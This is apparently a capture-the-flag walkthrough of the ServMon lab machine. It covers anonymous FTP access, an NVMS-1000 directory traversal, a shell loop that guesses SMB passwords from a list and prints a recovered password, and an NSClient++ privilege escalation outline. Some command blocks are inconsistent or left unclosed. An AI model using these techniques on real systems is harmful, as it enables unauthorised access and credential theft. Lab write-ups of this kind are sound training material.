### Interesting Ports to Note

* FTP (21/TCP) - FTP service & Anonymous login allowed
* HTTP (80/TCP) - NVMS-1000 login page

![image](/assets/img/post/htb/servmon/02.png)

* SMB (445/TCP) - No anonymous access allowed

```console
root@kali:~/Documents/htb/box/servmon# smbmap -H 10.10.10.184
[!] Authentication error on 10.10.10.184

root@kali:~/Documents/htb/box/servmon# smbclient -N -L //10.10.10.184
session setup failed: NT_STATUS_ACCESS_DENIED
```

* HTTPS (8443/TCP) - NSClient++ Page

# Initial Foothold

## Anonymous FTP

The FTP was allowing the `anonmyous` login. Under the `Users` directory, we can find two files: `Confidential.txt`, `Notes to do.txt`

```console
ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

01-18-20  11:10AM                  186 Notes to do.txt
226 Transfer complete.

ftp> get Notes\ to\ do.txt
local: to remote: 'Notes
200 PORT command successful.
550 The system cannot find the file specified.
```

The `Confidential.txt` file shows that Nadine left Nathan's `Password.txt` on Nathan's Desktop.

```console
$ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

And the `Notes to do.txt` contains some to-do steps. 

```console
$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

## NVMS-1000 Directory Traversal Vulnerability

Further Google search found that `NVMS-1000` is vulnerable to a directory traversal. It can be found [here](https://www.exploit-db.com/exploits/48311). Using `Burp`, we can confirm that the host is vulnerable: 

![image](/assets/img/post/htb/servmon/04.png)

Leveraging this vulnerability, we can view the `/Users/Nathan/Desktop/Passwords.txt` file.

## SMB Password Guessing

Since the passwords were found from the `nathan`'s desktop, we can try to bruteforce them against his account. But it did not find the correct password.

```console
$while read i; do echo "[INFO] Password: $i" && smbclient.py servmon/nathan:$i@10.10.10.184; done < pass.txt 

[INFO] Password: 1nsp3ctTh3Way2Mars!

```

Next, we can try it against `nadine` user account. And it found the correct password `L1k3B1gBut7s@W0rk`.

```console
$ while read i; do echo "[INFO] Password: $i" && smbclient.py servmon/nadine:$i@10.10.10.184; done < pass.txt

## SSH Login

Using that credentials, we can ssh into the box and read the `user.txt` flag.

# Privilege Escalation

## Nadine --> SYSTEM (NSClient++ Privilege Escalation)

There is a public privilege escalation for NSClient++. It can be found [here](https://www.exploit-db.com/exploits/46802). In a nutshell, a low privileged user can read the web admin password for NSClient++ from its configuration file. Within the web, due to a lack of restrictions, a user can create a scheduled script to run and NSClient++ is usually running as a Local SYSTEM. Abusing this, one can escalate its privilege to SYSTEM.
